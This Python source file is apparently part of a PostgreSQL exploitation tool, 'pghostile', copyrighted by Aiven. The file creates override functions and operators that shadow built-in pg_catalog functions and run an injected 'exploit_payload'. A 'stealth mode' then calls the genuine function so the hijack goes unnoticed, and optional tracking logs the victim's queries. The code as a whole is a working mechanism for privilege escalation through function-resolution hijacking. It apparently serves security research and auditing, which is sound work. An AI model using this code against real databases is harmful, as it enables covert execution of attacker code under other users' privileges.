# Copyright (c) 2022 Aiven, Helsinki, Finland. https://aiven.io
import json
import psycopg2
from core.utils import convert_rettype, pgtype_get_names_map, get_test_value_for_type, expand_matrix
from core.constants import Constants

class DBFunctionOverride:
    def __init__(self, dbfunction, params_type, exploit_payload, stealth_mode=True, track_execution=False):
        self.dbfunction = dbfunction
        self.db = dbfunction.db
        self.name = dbfunction.name
        self.params_type = params_type
        self.initial_params_type = dbfunction.params_type
        self.nparams = len(self.params_type)
        self.initial_rettype = dbfunction.rettype
        self.rettype = convert_rettype(self.initial_rettype)
        self.exploit_payload = exploit_payload
        self.stealth_mode = stealth_mode
        self.created = False
        self.operator_created = False
        self.test_ok = False
        self.test_failure_message = None
        self.tested_queries = []
        self.oid = None
        self.operator = dbfunction.operator

        pg_type_names = pgtype_get_names_map()
        argnames = "abcdefghijklmnopqrstuvwxyz"
        self.params_type_name = []
        test_params = []
        inargs = []
        callargs = []
        for i in range(0, self.nparams):
            tn = pg_type_names[self.params_type[i]]
            self.params_type_name.append(tn)
            inargs.append(f"{argnames[i]} {tn}")
            rtypecast = pg_type_names[self.initial_params_type[i]]
            # do not cast internal or the 'any' types
            if rtypecast == "internal" or rtypecast.startswith("any"):
                callargs.append(argnames[i])
            else:
                callargs.append("%s::%s" % (argnames[i], rtypecast))
            test_params.append(get_test_value_for_type(self.initial_params_type[i]))
        callargs = ", ".join(callargs)
        self.definition = "%s(%s)" % (self.name, ", ".join(inargs))
        self.drop_query = "drop function %s.%s(%s)" % (Constants.DESTINATON_SCHEMA, self.name, ", ".join(self.params_type_name))

        self.test_queries = []
        for pars in expand_matrix([test_params]):
            self.test_queries.append("select %s(%s)" % (self.name, ", ".join(pars)))
            if self.operator:
                # print("select %s %s %s" % (pars[0], self.operator, pars[1]))
                self.test_queries.append("select %s %s %s" % (pars[0], self.operator, pars[1]))

        if self.stealth_mode:
            base_qry = f"""
                create function {Constants.DESTINATON_SCHEMA}.{self.definition}
                returns {pg_type_names[self.rettype]} as
                $$
                    %s%s
                    select pg_catalog.{self.name}({callargs});
                $$
                language sql;
            """
        else:
            base_qry = f"""
                create function {Constants.DESTINATON_SCHEMA}.{self.definition}
                returns integer as
                $$
                    %s%s
                    select 1;
                $$
                language sql;
            """

        if track_execution:
            tracker = """
                insert into pghostile.triggers (fname, params, current_query) values ('%s', '%s', pg_catalog.current_query());
            """ % (self.name, json.dumps(self.params_type_name))
        else:
            tracker = ""

        self.create_query_test = base_qry % ("", "create table pg_temp.___pghostile_test_wrapper(a integer);")
        self.create_query_exploit = base_qry % (tracker, self.exploit_payload)
        if self.operator:
            self.create_query_operator = f"""
                CREATE OPERATOR {Constants.DESTINATON_SCHEMA}.{self.operator}(
                    leftarg = {self.params_type_name[0]},
                    rightarg = {self.params_type_name[1]},
                    function = {Constants.DESTINATON_SCHEMA}.{self.name}
                )
            """
            self.drop_query_operator = f"drop operator {Constants.DESTINATON_SCHEMA}.{self.operator}({self.params_type_name[0]}, {self.params_type_name[1]})"
        else:
            self.create_query_operator = None
            self.drop_query_operator = None

    def run_test(self):
        self.tested_queries = []
        if self.operator:
            try:
                self.db.query(self.drop_query_operator)
            except psycopg2.errors.Error:
                pass
        try:
            self.db.query(self.drop_query)
        except psycopg2.errors.Error:
            pass
        try:
            self.db.query(self.create_query_test)
        except psycopg2.errors.Error as e:
            self.test_ok = False
            self.test_failure_message = "Database error while creating test function: %s" % e
            return False
        if self.operator:
            try:
                self.db.query(self.create_query_operator)
            except psycopg2.errors.Error as e:
                # @TODO !!!
                pass

        for qry in self.test_queries:
            try:
                self.db.query("drop table if exists pg_temp.___pghostile_test_wrapper")
                self.db.query(qry)
                self.db.query("select * from pg_temp.___pghostile_test_wrapper")
                self.db.query("drop table pg_temp.___pghostile_test_wrapper")

                self.tested_queries.append(qry)
                # self.test_ok = True
            except psycopg2.errors.Error:
                pass

        if self.operator:
            try:
                self.db.query(self.drop_query_operator)
            except psycopg2.errors.Error as e:
                # raise Exception("Database error while deleting test function: %s" % e)
                pass

        try:
            self.db.query(self.drop_query)
        except psycopg2.errors.Error as e:
            raise Exception("Database error while deleting test function: %s" % e)

        if len(self.tested_queries) == 0:
            self.test_failure_message = "No valid queries found"
            return False

        return True

    def create_exploit_function(self):
        if self.operator:
            try:
                self.db.query(self.drop_query_operator)
            except psycopg2.errors.Error:
                pass
        try:
            self.db.query(self.drop_query)
        except psycopg2.errors.Error:
            pass
        try:
            self.db.query(self.create_query_exploit)
            self.created = True
            if self.operator:
                try:
                    self.db.query(self.create_query_operator)
                    self.operator_created = True
                except psycopg2.errors.DuplicateFunction:
                    pass
        except psycopg2.errors.Error as e:
            raise Exception("Database error while creating exploit function: %s" % e)

    def get_oid(self):
        if self.oid:
            return self.oid
        qry = """
            SELECT p.oid as oid FROM pg_catalog.pg_namespace n JOIN pg_catalog.pg_proc p ON p.pronamespace = n.oid
            WHERE p.prokind = 'f' and n.nspname = %s and p.proname = %s and p.proargtypes = %s::oidvector
        """
        try:
            res = self.db.query(qry, (Constants.DESTINATON_SCHEMA, self.name, self.params_type))
            row = res.fetchone()
            if not row:
                return None
            self.oid = row['oid']
            return self.oid
        except psycopg2.errors.Error as e:
            raise e

    def exists(self):
        return self.get_oid() is not None

    def __str__(self):
        return self.definition

    def __eq__(self, o):
        return self.definition == o.definition
